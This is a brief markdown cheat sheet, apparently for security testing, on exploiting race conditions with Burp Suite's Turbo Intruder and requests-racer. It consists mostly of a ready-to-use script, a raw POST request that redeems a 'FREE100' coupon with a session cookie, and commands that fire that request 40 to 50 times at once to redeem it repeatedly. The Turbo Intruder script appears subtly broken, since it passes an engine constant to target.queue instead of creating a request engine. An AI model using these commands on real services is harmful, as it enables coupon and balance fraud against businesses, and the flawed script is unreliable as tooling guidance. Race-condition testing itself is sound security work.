# Race Conditions

## Tool 1: **Turbo Intruder (Burp Suite)**

### ▶️ Methodology (Exact)

1. Intercept request in **Burp Proxy**
2. Send to **Turbo Intruder**
3. Use same request multiple times

### ▶️ Turbo Intruder Script (FINAL)

```python
def queueRequests(target, wordlists):
    engine = Engine.CONCURRENT
    for i in range(40):
        target.queue(target.req, engine=engine)

def handleResponse(req, interesting):
    table.add(req)
```

### ▶️ Run

* Engine: `CONCURRENT`
* Threads: `30–50`
* Fire

## 🥈 Tool 2: **requests-racer**

### 📌 Requirement

* **Raw HTTP request file**

#### `request.txt`

```txt
POST /api/redeem HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=XYZ

{"coupon":"FREE100"}
```

### ▶️ Run (FINAL COMMAND)

```bash
requests-racer request.txt -n 40
```

### ▶️ Faster (No Delay)

```bash
requests-racer request.txt -n 50 --delay 0
```

# TL;DR

| Tool           | Requirement       |
| -------------- | ----------------- |
| Turbo Intruder | Same POST request |
| requests-racer | request.txt       |

